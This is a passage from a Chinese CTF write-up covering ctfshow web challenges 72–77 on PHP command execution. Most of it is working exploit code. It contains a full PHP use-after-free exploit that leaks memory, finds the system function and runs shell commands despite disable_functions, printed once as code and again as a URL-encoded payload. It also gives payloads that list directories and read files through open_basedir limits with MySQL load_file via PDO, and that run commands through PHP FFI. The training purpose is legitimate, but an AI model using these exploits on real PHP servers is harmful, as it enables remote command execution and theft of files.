        for($i = 0; $i < $e_phnum; $i++) {
            $header = $base + $e_phoff + $i * $e_phentsize;
            $p_type  = leak($header, 0, 4);
            $p_flags = leak($header, 4, 4);
            $p_vaddr = leak($header, 0x10);
            $p_memsz = leak($header, 0x28);

            if($p_type == 1 && $p_flags == 6) { 

                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
                $data_size = $p_memsz;
            } else if($p_type == 1 && $p_flags == 5) { 
                $text_size = $p_memsz;
            }
        }

        if(!$data_addr || !$text_size || !$data_size)
            return false;

        return [$data_addr, $text_size, $data_size];
    }

    function get_basic_funcs($base, $elf) {
        list($data_addr, $text_size, $data_size) = $elf;
        for($i = 0; $i < $data_size / 8; $i++) {
            $leak = leak($data_addr, $i * 8);
            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = leak($leak);
                
                if($deref != 0x746e6174736e6f63)
                    continue;
            } else continue;

            $leak = leak($data_addr, ($i + 4) * 8);
            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = leak($leak);
                
                if($deref != 0x786568326e6962)
                    continue;
            } else continue;

            return $data_addr + $i * 8;
        }
    }

    function get_binary_base($binary_leak) {
        $base = 0;
        $start = $binary_leak & 0xfffffffffffff000;
        for($i = 0; $i < 0x1000; $i++) {
            $addr = $start - 0x1000 * $i;
            $leak = leak($addr, 0, 7);
            if($leak == 0x10102464c457f) {
                return $addr;
            }
        }
    }

    function get_system($basic_funcs) {
        $addr = $basic_funcs;
        do {
            $f_entry = leak($addr);
            $f_name = leak($f_entry, 0, 6);

            if($f_name == 0x6d6574737973) {
                return leak($addr + 8);
            }
            $addr += 0x20;
        } while($f_entry != 0);
        return false;
    }

    function trigger_uaf($arg) {

        $arg = str_shuffle('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA');
        $vuln = new Vuln();
        $vuln->a = $arg;
    }

    if(stristr(PHP_OS, 'WIN')) {
        die('This PoC is for *nix systems only.');
    }

    $n_alloc = 10; 
    $contiguous = [];
    for($i = 0; $i < $n_alloc; $i++)
        $contiguous[] = str_shuffle('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA');

    trigger_uaf('x');
    $abc = $backtrace[1]['args'][0];

    $helper = new Helper;
    $helper->b = function ($x) { };

    if(strlen($abc) == 79 || strlen($abc) == 0) {
        die("UAF failed");
    }

    $closure_handlers = str2ptr($abc, 0);
    $php_heap = str2ptr($abc, 0x58);
    $abc_addr = $php_heap - 0xc8;

    write($abc, 0x60, 2);
    write($abc, 0x70, 6);

    write($abc, 0x10, $abc_addr + 0x60);
    write($abc, 0x18, 0xa);

    $closure_obj = str2ptr($abc, 0x20);

    $binary_leak = leak($closure_handlers, 8);
    if(!($base = get_binary_base($binary_leak))) {
        die("Couldn't determine binary base address");
    }

    if(!($elf = parse_elf($base))) {
        die("Couldn't parse ELF header");
    }

    if(!($basic_funcs = get_basic_funcs($base, $elf))) {
        die("Couldn't get basic_functions address");
    }

    if(!($zif_system = get_system($basic_funcs))) {
        die("Couldn't get zif_system address");
    }


    $fake_obj_offset = 0xd0;
    for($i = 0; $i < 0x110; $i += 8) {
        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));
    }

    write($abc, 0x20, $abc_addr + $fake_obj_offset);
    write($abc, 0xd0 + 0x38, 1, 4); 
    write($abc, 0xd0 + 0x68, $zif_system); 

    ($helper->b)($cmd);
    exit();
}

ctfshow("cat /flag0.txt");ob_end_flush();
?>
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/23087450/1637904931173-2f43abe6-16cd-4015-a29d-8a3e86045076.png#clientId=u90c89801-edf6-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=450&id=u2a40129a&margin=%5Bobject%20Object%5D&name=image.png&originHeight=816&originWidth=1056&originalType=binary&ratio=1&rotation=0&showTitle=false&size=124667&status=done&style=none&taskId=u446bab68-0c05-4151-bc4a-f1279591da6&title=&width=582)
```php
c=%3F%3E%3C%3Fphp%0A%0Afunction%20ctfshow(%24cmd)%20%7B%0A%20%20%20%20global%20%24abc%2C%20%24helper%2C%20%24backtrace%3B%0A%0A%20%20%20%20class%20Vuln%20%7B%0A%20%20%20%20%20%20%20%20public%20%24a%3B%0A%20%20%20%20%20%20%20%20public%20function%20__destruct()%20%7B%20%0A%20%20%20%20%20%20%20%20%20%20%20%20global%20%24backtrace%3B%20%0A%20%20%20%20%20%20%20%20%20%20%20%20unset(%24this-%3Ea)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24backtrace%20%3D%20(new%20Exception)-%3EgetTrace()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(!isset(%24backtrace%5B1%5D%5B'args'%5D))%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24backtrace%20%3D%20debug_backtrace()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20class%20Helper%20%7B%0A%20%20%20%20%20%20%20%20public%20%24a%2C%20%24b%2C%20%24c%2C%20%24d%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20str2ptr(%26%24str%2C%20%24p%20%3D%200%2C%20%24s%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20%24address%20%3D%200%3B%0A%20%20%20%20%20%20%20%20for(%24j%20%3D%20%24s-1%3B%20%24j%20%3E%3D%200%3B%20%24j--)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24address%20%3C%3C%3D%208%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24address%20%7C%3D%20ord(%24str%5B%24p%2B%24j%5D)%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20return%20%24address%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20ptr2str(%24ptr%2C%20%24m%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20%24out%20%3D%20%22%22%3B%0A%20%20%20%20%20%20%20%20for%20(%24i%3D0%3B%20%24i%20%3C%20%24m%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24out%20.%3D%20sprintf(%22%25c%22%2C(%24ptr%20%26%200xff))%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24ptr%20%3E%3E%3D%208%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20return%20%24out%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20write(%26%24str%2C%20%24p%2C%20%24v%2C%20%24n%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20%24i%20%3D%200%3B%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24n%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24str%5B%24p%20%2B%20%24i%5D%20%3D%20sprintf(%22%25c%22%2C(%24v%20%26%200xff))%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24v%20%3E%3E%3D%208%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20leak(%24addr%2C%20%24p%20%3D%200%2C%20%24s%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20global%20%24abc%2C%20%24helper%3B%0A%20%20%20%20%20%20%20%20write(%24abc%2C%200x68%2C%20%24addr%20%2B%20%24p%20-%200x10)%3B%0A%20%20%20%20%20%20%20%20%24leak%20%3D%20strlen(%24helper-%3Ea)%3B%0A%20%20%20%20%20%20%20%20if(%24s%20!%3D%208)%20%7B%20%24leak%20%25%3D%202%20%3C%3C%20(%24s%20*%208)%20-%201%3B%20%7D%0A%20%20%20%20%20%20%20%20return%20%24leak%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20parse_elf(%24base)%20%7B%0A%20%20%20%20%20%20%20%20%24e_type%20%3D%20leak(%24base%2C%200x10%2C%202)%3B%0A%0A%20%20%20%20%20%20%20%20%24e_phoff%20%3D%20leak(%24base%2C%200x20)%3B%0A%20%20%20%20%20%20%20%20%24e_phentsize%20%3D%20leak(%24base%2C%200x36%2C%202)%3B%0A%20%20%20%20%20%20%20%20%24e_phnum%20%3D%20leak(%24base%2C%200x38%2C%202)%3B%0A%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24e_phnum%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24header%20%3D%20%24base%20%2B%20%24e_phoff%20%2B%20%24i%20*%20%24e_phentsize%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_type%20%20%3D%20leak(%24header%2C%200%2C%204)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_flags%20%3D%20leak(%24header%2C%204%2C%204)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_vaddr%20%3D%20leak(%24header%2C%200x10)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_memsz%20%3D%20leak(%24header%2C%200x28)%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24p_type%20%3D%3D%201%20%26%26%20%24p_flags%20%3D%3D%206)%20%7B%20%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24data_addr%20%3D%20%24e_type%20%3D%3D%202%20%3F%20%24p_vaddr%20%3A%20%24base%20%2B%20%24p_vaddr%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24data_size%20%3D%20%24p_memsz%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20if(%24p_type%20%3D%3D%201%20%26%26%20%24p_flags%20%3D%3D%205)%20%7B%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24text_size%20%3D%20%24p_memsz%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20if(!%24data_addr%20%7C%7C%20!%24text_size%20%7C%7C%20!%24data_size)%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20false%3B%0A%0A%20%20%20%20%20%20%20%20return%20%5B%24data_addr%2C%20%24text_size%2C%20%24data_size%5D%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20get_basic_funcs(%24base%2C%20%24elf)%20%7B%0A%20%20%20%20%20%20%20%20list(%24data_addr%2C%20%24text_size%2C%20%24data_size)%20%3D%20%24elf%3B%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24data_size%20%2F%208%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3D%20leak(%24data_addr%2C%20%24i%20*%208)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24leak%20-%20%24base%20%3E%200%20%26%26%20%24leak%20-%20%24base%20%3C%20%24data_addr%20-%20%24base)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24deref%20%3D%20leak(%24leak)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if(%24deref%20!%3D%200x746e6174736e6f63)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20continue%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20continue%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3D%20leak(%24data_addr%2C%20(%24i%20%2B%204)%20*%208)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24leak%20-%20%24base%20%3E%200%20%26%26%20%24leak%20-%20%24base%20%3C%20%24data_addr%20-%20%24base)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24deref%20%3D%20leak(%24leak)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if(%24deref%20!%3D%200x786568326e6962)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20continue%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20continue%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20%24data_addr%20%2B%20%24i%20*%208%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20get_binary_base(%24binary_leak)%20%7B%0A%20%20%20%20%20%20%20%20%24base%20%3D%200%3B%0A%20%20%20%20%20%20%20%20%24start%20%3D%20%24binary_leak%20%26%200xfffffffffffff000%3B%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%200x1000%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24addr%20%3D%20%24start%20-%200x1000%20*%20%24i%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3D%20leak(%24addr%2C%200%2C%207)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24leak%20%3D%3D%200x10102464c457f)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20%24addr%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20get_system(%24basic_funcs)%20%7B%0A%20%20%20%20%20%20%20%20%24addr%20%3D%20%24basic_funcs%3B%0A%20%20%20%20%20%20%20%20do%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24f_entry%20%3D%20leak(%24addr)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24f_name%20%3D%20leak(%24f_entry%2C%200%2C%206)%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24f_name%20%3D%3D%200x6d6574737973)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20leak(%24addr%20%2B%208)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%24addr%20%2B%3D%200x20%3B%0A%20%20%20%20%20%20%20%20%7D%20while(%24f_entry%20!%3D%200)%3B%0A%20%20%20%20%20%20%20%20return%20false%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20trigger_uaf(%24arg)%20%7B%0A%0A%20%20%20%20%20%20%20%20%24arg%20%3D%20str_shuffle('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA')%3B%0A%20%20%20%20%20%20%20%20%24vuln%20%3D%20new%20Vuln()%3B%0A%20%20%20%20%20%20%20%20%24vuln-%3Ea%20%3D%20%24arg%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(stristr(PHP_OS%2C%20'WIN'))%20%7B%0A%20%20%20%20%20%20%20%20die('This%20PoC%20is%20for%20*nix%20systems%20only.')%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20%24n_alloc%20%3D%2010%3B%20%0A%20%20%20%20%24contiguous%20%3D%20%5B%5D%3B%0A%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24n_alloc%3B%20%24i%2B%2B)%0A%20%20%20%20%20%20%20%20%24contiguous%5B%5D%20%3D%20str_shuffle('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA')%3B%0A%0A%20%20%20%20trigger_uaf('x')%3B%0A%20%20%20%20%24abc%20%3D%20%24backtrace%5B1%5D%5B'args'%5D%5B0%5D%3B%0A%0A%20%20%20%20%24helper%20%3D%20new%20Helper%3B%0A%20%20%20%20%24helper-%3Eb%20%3D%20function%20(%24x)%20%7B%20%7D%3B%0A%0A%20%20%20%20if(strlen(%24abc)%20%3D%3D%2079%20%7C%7C%20strlen(%24abc)%20%3D%3D%200)%20%7B%0A%20%20%20%20%20%20%20%20die(%22UAF%20failed%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20%24closure_handlers%20%3D%20str2ptr(%24abc%2C%200)%3B%0A%20%20%20%20%24php_heap%20%3D%20str2ptr(%24abc%2C%200x58)%3B%0A%20%20%20%20%24abc_addr%20%3D%20%24php_heap%20-%200xc8%3B%0A%0A%20%20%20%20write(%24abc%2C%200x60%2C%202)%3B%0A%20%20%20%20write(%24abc%2C%200x70%2C%206)%3B%0A%0A%20%20%20%20write(%24abc%2C%200x10%2C%20%24abc_addr%20%2B%200x60)%3B%0A%20%20%20%20write(%24abc%2C%200x18%2C%200xa)%3B%0A%0A%20%20%20%20%24closure_obj%20%3D%20str2ptr(%24abc%2C%200x20)%3B%0A%0A%20%20%20%20%24binary_leak%20%3D%20leak(%24closure_handlers%2C%208)%3B%0A%20%20%20%20if(!(%24base%20%3D%20get_binary_base(%24binary_leak)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn't%20determine%20binary%20base%20address%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(!(%24elf%20%3D%20parse_elf(%24base)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn't%20parse%20ELF%20header%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(!(%24basic_funcs%20%3D%20get_basic_funcs(%24base%2C%20%24elf)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn't%20get%20basic_functions%20address%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(!(%24zif_system%20%3D%20get_system(%24basic_funcs)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn't%20get%20zif_system%20address%22)%3B%0A%20%20%20%20%7D%0A%0A%0A%20%20%20%20%24fake_obj_offset%20%3D%200xd0%3B%0A%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%200x110%3B%20%24i%20%2B%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20write(%24abc%2C%20%24fake_obj_offset%20%2B%20%24i%2C%20leak(%24closure_obj%2C%20%24i))%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20write(%24abc%2C%200x20%2C%20%24abc_addr%20%2B%20%24fake_obj_offset)%3B%0A%20%20%20%20write(%24abc%2C%200xd0%20%2B%200x38%2C%201%2C%204)%3B%20%0A%20%20%20%20write(%24abc%2C%200xd0%20%2B%200x68%2C%20%24zif_system)%3B%20%0A%0A%20%20%20%20(%24helper-%3Eb)(%24cmd)%3B%0A%20%20%20%20exit()%3B%0A%7D%0A%0Actfshow(%22cat%20%2Fflag0.txt%22)%3Bob_end_flush()%3B%0A%3F%3E
```
## web73（突破禁用函数）
这个题不能用上个题的uaf了，老姿势仍然可用，第一步查看根目录文件
c=var_export(scandir('/'));exit();
![image.png](https://cdn.nlark.com/yuque/0/2021/png/23087450/1637905712177-72521d9e-8cba-4513-abed-f168f3dcc0fb.png#clientId=u90c89801-edf6-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=400&id=u169392be&margin=%5Bobject%20Object%5D&name=image.png&originHeight=706&originWidth=1160&originalType=binary&ratio=1&rotation=0&showTitle=false&size=80059&status=done&style=none&taskId=u8cdf9dc2-3e77-41a7-91bb-171b2644f68&title=&width=657)
第二步包含
![image.png](https://cdn.nlark.com/yuque/0/2021/png/23087450/1637905779853-de10e256-7c85-4d76-918a-25906457571b.png#clientId=u90c89801-edf6-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=400&id=uad499b70&margin=%5Bobject%20Object%5D&name=image.png&originHeight=725&originWidth=1141&originalType=binary&ratio=1&rotation=0&showTitle=false&size=71453&status=done&style=none&taskId=u4b717109-ab49-4e22-b77b-e608df41a9a&title=&width=630)
最终payload：c=include('/flagc.txt');exit();
## web74（突破禁用函数）
```php
Warning: scandir() has been disabled for security reasons in /var/www/html/index.php(19) : eval()'d code on line 1
```
scandir被禁用了，那么就构造php代码读文件
```php
c=?><?php $dir='/';
if($dh = opendir($dir)){
while (($file = readdir($dh)) !== false)
echo $file.' ';
}
exit();?>
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/23087450/1637906955972-ad87a8c0-8de0-4209-b969-2f28d14322e3.png#clientId=u49b8dfee-3762-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=30&id=u8e2df6d6&margin=%5Bobject%20Object%5D&name=image.png&originHeight=38&originWidth=966&originalType=binary&ratio=1&rotation=0&showTitle=false&size=5051&status=done&style=none&taskId=uf615df8a-3aba-4b2c-9751-95597726f78&title=&width=763)
得到文件在flagx.txt
最终payload：c=include('/flagx.txt');exit();
## web75（PDO）
这次读目录不可行了，那么就换个姿势
```php
c=?><?php 
$a=new DirectoryIterator("glob:///*");
foreach($a as $f)
{echo($f.' ');}
exit();
?>
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/23087450/1637907212607-438c0ab9-015a-46f2-bd07-e59084ed165a.png#clientId=u49b8dfee-3762-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=30&id=u903b8919&margin=%5Bobject%20Object%5D&name=image.png&originHeight=33&originWidth=825&originalType=binary&ratio=1&rotation=0&showTitle=false&size=4467&status=done&style=none&taskId=uaebf819a-f505-4c20-baa1-1b474cab8e7&title=&width=750)得到文件在flag36.txt，这时候直接包含是拿不到答案的，会报错open_base，但可以通过其他应用比如说mysql来访问，如下使用pdo
```php
c=try{
  $dbh = new PDO('mysql:host=localhost;dbname=ctftraining', 'root','root');
  foreach($dbh->query('select load_file("/flag36.txt")') as $row)
		{echo($row[0])."|"; }
  $dbh = null;
}
catch (PDOException $e)
{echo $e->getMessage();exit(0);}
exit(0);
```
> PHP 数据对象 （PDO） 扩展为PHP访问数据库定义了一个轻量级的一致接口。
> PDO 提供了一个数据访问抽象层，这意味着，不管使用哪种数据库，都可以用相同的函数（方法）来查询和获取数据

## web76（PDO）
做法同上，flag在flag36d.txt
## web77（PDO）
这个题不让用mysql了，前两个题的做法在这里行不通了
先读一下根目录下的所有文件
```php
c=?><?php 
$a=new DirectoryIterator("glob:///*");
foreach($a as $f)
{echo($f.' ');}
exit();
?>
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/23087450/1637909954366-8afa163f-b5f7-4c1d-a9db-e3f5d15a2cdd.png#clientId=u49b8dfee-3762-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=20&id=u6babaa48&margin=%5Bobject%20Object%5D&name=image.png&originHeight=28&originWidth=1024&originalType=binary&ratio=1&rotation=0&showTitle=false&size=5383&status=done&style=none&taskId=uec8e5e27-d1c1-4c06-b254-8da1f008ef2&title=&width=731)
有两个可疑文件，flag36x.txt和readflag，留着备用，先放payload
```php
c=$ffi = FFI::cdef("int system(const char *command);");
$a='/readflag > 1.txt';
$ffi->system($a);
```
看了hint说这是php7.4特性，留个链接参考：[php7.4中的FFI介绍](https://www.php.cn/php-weizijiaocheng-415807.html)
​

## 写在最后
命令执行第一部分到此结束啦，这里只作为个人做题记录，欢迎各位师傅斧正。
​

2021-11-26 15:09 By KonDream
